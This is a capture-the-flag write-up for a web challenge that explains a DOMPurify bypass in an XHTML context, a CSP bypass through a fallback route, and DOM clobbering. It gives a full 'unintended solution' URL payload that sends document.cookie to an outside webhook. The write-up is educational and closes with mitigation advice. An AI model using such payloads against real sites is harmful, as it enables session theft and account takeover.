# Sanitized

* Category: Web
* Score: 498/500
* Solves: 5

## Description

You are not going to find a DOMPurify 0day right?

## Solution

- DOMPurify uses HTML parser by default, but XHTML parsing allows CDATA so it is possible to use a combination of `<style>` and CDATA to bypass it. Actual HTML payload should be encoded inside a HTML attribute.
- To bypass CSP, you need to abuse the **page not found** fallback route and use that to construct a valid js using url path.
- It is necessary to clobber `window.Page` to prevent the js from throwing error.
- To make a `<script>` tag load when inserted using `innerHTML`, the only way is to use `<iframe srcdoc="...">`. But you can't do that easily as XHTML does not allow `<` in attribute value, and you can't easily emit a `&lt;` token from HTML's attribute context.
- The trick is to inject a `<base href="...">` to change the base url, then the subsequent `report.js` script tag will use the new base url, which triggers the fallback route.
- `solve.js`

> To actually use DOMPurify safely in XHTML context, you must use `{PARSER_MEDIA_TYPE: 'application/xhtml+xml'}` option to tell DOMPurify to use XHTML parser instead of HTML parser.

## Unintended solution

Submit `/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//asd%2f..%2f..%2findex.xhtml#https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?` to the bot.

The reason that this works is because browser considers this path as loading a file named `asd%2f..%2f..%2findex.xhtml` from an directory called `1;var[Page]=[1];location=location.hash.slice(1)+document.cookie`, but express will treat `%2f` as `/` so it still loads the `index.xhtml` successfully. Since `index.xhtml` load various scripts like `main.js` using relative math, so it will attempt to load `/1;var[Page]=[1];name=location.hash.slice(1)+document.cookie//main.js`, which returns a valid js from the fallback route.

> This unintended solution is found by r3kapig first, but I rewrote the payload to make it more concise.
